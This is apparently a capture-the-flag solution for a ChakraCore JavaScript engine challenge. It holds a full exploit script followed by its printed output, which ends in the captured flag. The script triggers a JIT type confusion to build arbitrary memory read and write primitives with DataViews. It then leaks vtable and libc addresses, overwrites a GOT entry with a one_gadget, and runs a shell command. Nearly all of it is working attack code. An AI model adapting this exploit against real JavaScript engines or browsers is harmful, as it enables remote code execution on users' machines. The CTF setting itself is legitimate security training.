
Enter JS Code:
// commit 331aa3931ab69ca2bd64f7e020165e693b8030b5
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

dv1 = new DataView(new ArrayBuffer(0x100));
dv2 = new DataView(new ArrayBuffer(0x100));

BASE = 0x100000000;

function hex(x) {
    return "0x" + x.toString(16);
}

function opt(o, c, value) {
    o.b = 1;

    let temp = {__proto__: c};

    o.a = value;
}

function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    let o = {a: 1, b: 2};
  
    opt(o, o, obj); // o->auxSlots = obj (Step 1)
    
    o.c = dv1; // obj->auxSlots = dv1 (Step 2)
    
    obj.h = dv2; // dv1->buffer = dv2 (Step 3)
    
    let read64 = function(addr_lo, addr_hi) {
        // dv2->buffer = addr (Step 4)
        dv1.setUint32(0x38, addr_lo, true);
        dv1.setUint32(0x3C, addr_hi, true);
        
        // read from addr (Step 5)
        return dv2.getInt32(0, true) + dv2.getInt32(4, true) * BASE;
    }
    let read3232 = function(addr_lo, addr_hi) {
        // dv2->buffer = addr (Step 4)
        dv1.setUint32(0x38, addr_lo, true);
        dv1.setUint32(0x3C, addr_hi, true);
        
        // read from addr (Step 5)
        return [dv2.getInt32(0, true), dv2.getInt32(4, true)];
    }
    
    let write64 = function(addr_lo, addr_hi, value_lo, value_hi) {
        // dv2->buffer = addr (Step 4)
        dv1.setUint32(0x38, addr_lo, true);
        dv1.setUint32(0x3C, addr_hi, true);
        
        // write to addr (Step 5)
        dv2.setInt32(0, value_lo, true);
        dv2.setInt32(4, value_hi, true);
    }
    
    // get dv2 vtable pointer
    vtable_lo = dv1.getUint32(0, true);
    vtable_hi = dv1.getUint32(4, true);
    print(hex(vtable_lo + vtable_hi * BASE));
    aux_arr = dv1.getUint32(7 * 8, true);
    aux_arrh = dv1.getUint32(7 * 8 + 4, true);
    print('aux array')
    print(hex(aux_arr + aux_arrh * BASE));
    print(hex(read64(vtable_lo, vtable_hi)));
    
    let gdb_base = 0xc3a52000;
    let vptr_off = 0xc48566e0 - gdb_base;
    let malloc_got = 0xc48a56e0 - gdb_base;
    let _got = 0xc48a5078 - gdb_base;
    let free_got = 0xc48a5128 - gdb_base
    let chackra_base_lo = vtable_lo - vptr_off;
    let one_gadget = 0x4f440;
    let free_off = 0x8dbce950 - 0x8db37000
    let memmove = free_got - 0x128 + 0x108
    let memset = free_got - 0x128 + 0x248
    print(hex(chackra_base_lo + vtable_hi * BASE));
    print('malloc and free')
    print(hex(read64(chackra_base_lo + malloc_got, vtable_hi)));
    print(hex(read64(chackra_base_lo + free_got, vtable_hi)));

    let libc = read3232(chackra_base_lo + free_got, vtable_hi);
    let libc_low = libc[0] - free_off;
    let libc_high = libc[1];
    print(hex(libc_low + libc_high * BASE))
    print('Writing on got');
    let vtable_entry=read3232(vtable_lo, vtable_hi);
    /*

    write64(vtable_lo, vtable_hi, libc_low + one_gadget, libc_high);
    dv2[0];

    write64(chackra_base_lo + free_got, vtable_hi, libc_low + one_gadget, libc_high);
    print(hex(read64(chackra_base_lo + free_got, vtable_hi)));

    print('hello');
    
    */
    write64(chackra_base_lo + memmove, vtable_hi, libc_low + one_gadget, libc_high);
    // write64(chackra_base_lo + memset, vtable_hi, libc_low + one_gadget, libc_high);
    print('there');
    let ab = new Uint8Array(0x1020);
    let ef = new Uint8Array(0x1020);
    let cmd = 'cat flag'
    for (let i = 0; i < 1000; i++) {
        ab[i] = 100 - i;
        ef[i] = cmd.charCodeAt(i);
    }
    ef[cmd.length] = 0;
    ab[0] = 0x41
    ab[1] = 0x41
    ab[2] = 0x41
    ab[3] = 0x41
    ab[4] = 0;
    ef.set(ab);
    write64(0x0, 0x0, libc_low + one_gadget, libc_high);
    //print(hex(read64(chackra_base_lo + free_got, vtable_hi)));
    let a = [];
    for (let i = 0; i < 1000000; i++) {
        a.push(0x1);
    }
}

main();

0x55c83cc4f320.
ls


JS Output:
0x7f987e6886e0
aux array
0x5653f6ea2d10
0x7f987da1cb50
0x7f987d884000
malloc and free
0x7f978037d070
0x7f978037d950
0x7f97802e6000
Writing on got
there
TMCTF{0ldj1773r_15_7yp3_c0nfu510n_0f_dyn4m1c0bj3c7}
